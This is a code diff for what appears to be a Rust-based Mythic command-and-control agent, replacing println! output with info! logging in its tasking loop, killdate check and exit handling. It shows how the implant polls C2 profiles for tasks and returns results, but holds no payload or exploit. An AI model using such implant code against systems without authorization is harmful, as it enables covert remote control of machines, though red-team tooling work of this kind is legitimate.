@@ -63,7 +63,7 @@ fn get_tasking_with<C: C2Transport>(
 
 fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<TaskResponse>) {
     if !pending.is_empty() {
-        println!("[*] flushing {} response(s) before exit", pending.len());
+        info!("[*] flushing {} response(s) before exit", pending.len());
         if let Err(e) = get_tasking_with(mythic, 5, c2, pending) {
             eprintln!("[!] flush failed: {e}");
         }
@@ -73,7 +73,7 @@ fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<Task
 /// If EXIT_PROCESS is set, terminate the process after flushing responses.
 fn maybe_exit_process() {
     if EXIT_PROCESS.load(Ordering::Acquire) {
-        println!("[*] exiting process");
+        info!("[*] exiting process");
         std::process::exit(0);
     }
 }
@@ -127,7 +127,7 @@ fn parse_killdate_ts(s: &str) -> u64 {
 
 pub fn run(config: Config) -> MythicResult<()> {
     let payload_uuid = config.payload_uuid;
-    println!("[*] Agent start, payload_uuid={}", payload_uuid);
+    info!("[*] Agent start, payload_uuid={}", payload_uuid);
 
     let profiles = config.c2_profiles;
     if profiles.is_empty() {
@@ -146,7 +146,7 @@ pub fn run(config: Config) -> MythicResult<()> {
         if ts > 0 {
             set_killdate(ts);
             if past_killdate() {
-                println!("[*] past killdate ({kd}), exiting");
+                info!("[*] past killdate ({kd}), exiting");
                 return Ok(());
             }
         }
@@ -160,7 +160,7 @@ pub fn run(config: Config) -> MythicResult<()> {
     let c2 = profiles.choose(&mut rng).unwrap();
     let tasking = get_tasking_with(&mythic, 5, c2, Vec::new())?;
     if DEBUG.load(Ordering::Relaxed) {
-        println!("task: {:?}", tasking);
+        info!("task: {:?}", tasking);
     }
     for t in &tasking.tasks {
         pending.push(safe_dispatch(t));
@@ -169,7 +169,7 @@ pub fn run(config: Config) -> MythicResult<()> {
         let c2 = profiles.choose(&mut rng).unwrap();
         flush_pending(&mythic, c2, pending);
         maybe_exit_process();
-        println!("[*] agent exited (thread)");
+        info!("[*] agent exited (thread)");
         return Ok(());
     }
 
@@ -190,7 +190,7 @@ pub fn run(config: Config) -> MythicResult<()> {
         match get_tasking_with(&mythic, 5, c2, batch.clone()) {
             Ok(tasking) => {
                 if DEBUG.load(Ordering::Relaxed) {
-                    println!("task: {:?}", tasking);
+                    info!("task: {:?}", tasking);
                 }
                 for t in &tasking.tasks {
                     pending.push(safe_dispatch(t));
@@ -199,7 +199,7 @@ pub fn run(config: Config) -> MythicResult<()> {
                     let c2 = profiles.choose(&mut rng).unwrap();
                     flush_pending(&mythic, c2, pending);
                     maybe_exit_process();
-                    println!("[*] agent exited (thread)");
+                    info!("[*] agent exited (thread)");
                     return Ok(());
                 }
             }
